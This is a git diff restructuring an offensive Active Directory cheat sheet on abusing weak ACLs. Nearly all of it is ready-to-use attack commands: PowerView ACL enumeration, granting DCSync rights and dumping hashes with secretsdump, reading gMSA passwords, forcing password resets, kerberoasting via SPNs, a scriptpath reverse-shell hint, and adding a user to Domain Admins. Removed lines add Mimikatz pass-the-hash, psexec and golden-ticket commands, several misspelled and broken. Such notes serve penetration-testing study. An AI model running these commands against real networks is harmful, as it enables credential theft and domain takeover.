@@ -1,35 +1,6 @@
----
-description: >-
-  This section will guide the reader to perform windows active directory
-  enumeration both credential and credential-less from the "kali" or "attacking"
-  box as well as from a windows domain joined host
----
+# Abuse Weak Access Control Lists (ACLs)
 
-# Windows Active Directory
-
-### Windows Active Directory
-
-```
-. .\PowerView.ps1
-```
-
-#### Abuse Weak Access Control Lists (ACLs)
-
-Find ACLs of interest whether it be the current compromised user, or users found. start with current user.
-
-{% code overflow="wrap" %}
-```
-Find-InterestingDomainAcl -ResolveGUIDs | where-object {$_.identityreferencename -like "*CompromisedUser*"}
-```
-{% endcode %}
-
-{% code overflow="wrap" %}
-```
-Find-InterestingDomainAcl -ResolveGUIDs | where-object {$_.ActiveDirectoryRights -like "*GenericAll*"} | Where-Object {$_.identityreferenceclass -ne "computer"}
-```
-{% endcode %}
-
-**Write DACL**
+## **Write DACL**
 
 {% code overflow="wrap" %}
 ```
@@ -42,11 +13,15 @@ $Cred = New-Object System.Management.Automation.PSCredential $CompromisedUser,$S
 Add-ObjectACL -PrincipalIdentity compromiseduser -Credential $cred -Rights DCSync
 ```
 
+_From the attacking box_
+
 ```
 secretsdumps.py $domain/user@$ip
 ```
 
-**GetChangesAll (DCSync)**
+## **GetChangesAll (DCSync)**
+
+_From the attacking box_
 
 ```
 secretsdump.py domain/user@ip
@@ -54,21 +29,23 @@ secretsdump.py domain/user@ip
 
 Or use Mimikatz
 
-**ReadGMSApassword**
+## **ReadGMSApassword**
 
-Remotely. _may need to use ntpdate $domain if you get clockscrew error_
+#### Remotely&#x20;
+
+_You may need to use ntpdate $domain if you get clockscrew error_
 
 ```
 python2 /opt/gMSADumper/gMSADumper.py -d $domain -u CompromisedUser -p Password
 ```
 
-Locally with EXE
+#### Locally&#x20;
 
 ```
 .\GMSAPasswordReader.exe --AccountName 'ReadGMSApassword_Rights_To_User'
 ```
 
-**ForceChangePassword**
+## **ForceChangePassword**
 
 ```
 $CompromisedUserName = 'CompromisedUserName'
@@ -96,7 +73,7 @@ Set-DomainUserPassword -Identity LateralEscUserName -AccountPassword $LateralEsc
 ```
 {% endcode %}
 
-**GenericAll**
+## **GenericAll**
 
 ```
 $CompromisedUserName = 'CompromisedUserName'
@@ -120,9 +97,9 @@ Invoke-Command -computername 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Iden
 ```
 {% endcode %}
 
-**GenericWrite**
+## **GenericWrite**
 
-Use this for reverseshell using scriptpath=, enumeration, or use serviceprincipalname= for kerberoast
+_Use this for reverseshell using scriptpath=, enumeration, or use serviceprincipalname= for kerberoast_
 
 ```ps1
 $CompromisedUserName = 'CompromisedUserName'
@@ -150,7 +127,7 @@ Set-DomainObject -Credential $Cred -Identity LateralEscUserName -SET @{servicepr
 Get-DomainSPNTicket -Credential $Cred LateralEscUserName | fl
 ```
 
-OR
+#### OR
 
 {% code overflow="wrap" %}
 ```
@@ -158,7 +135,7 @@ Set-DomainObject -Credential $Cred -Identity LateralEscUserName -SET @{scriptpat
 ```
 {% endcode %}
 
-**WriteOwner**
+## **WriteOwner**
 
 ```ps1
 $CompromisedUserName = 'CompromisedUserName'
@@ -194,32 +171,18 @@ Add-DomainGroupMember -Identity 'Domain Admins' -Members 'CompromisedUser' -Cred
 ```
 {% endcode %}
 
-#### Overpass The Hash
+## Automation
 
-```
-serkurlsa:logonpasswords
-```
-
-Copy user's NTML hash
+_Find ACLs of interest whether it be the current compromised user, or users found. start with current user._
 
 {% code overflow="wrap" %}
 ```
-serkurlsa::pth /user:compromised_user /domain:domain.com /ntml:copied_hash /run:PowerShell.exe
+Find-InterestingDomainAcl -ResolveGUIDs | where-object {$_.identityreferencename -like "*CompromisedUser*"}
 ```
 {% endcode %}
 
-```
-net use \\lateral-machine
-```
-
-```
-.\psexec.exe \\lateral-machine cmd.exe
-```
-
-#### Pass the Ticket
-
 {% code overflow="wrap" %}
 ```
-kerberos::golden /user:compromised_user /domain:domain.com /sid:domain-sid /target:web.domain.com /service:http /rc4:service_hash /ptt
+Find-InterestingDomainAcl -ResolveGUIDs | where-object {$_.ActiveDirectoryRights -like "*GenericAll*"} | Where-Object {$_.identityreferenceclass -ne "computer"}
 ```
 {% endcode %}
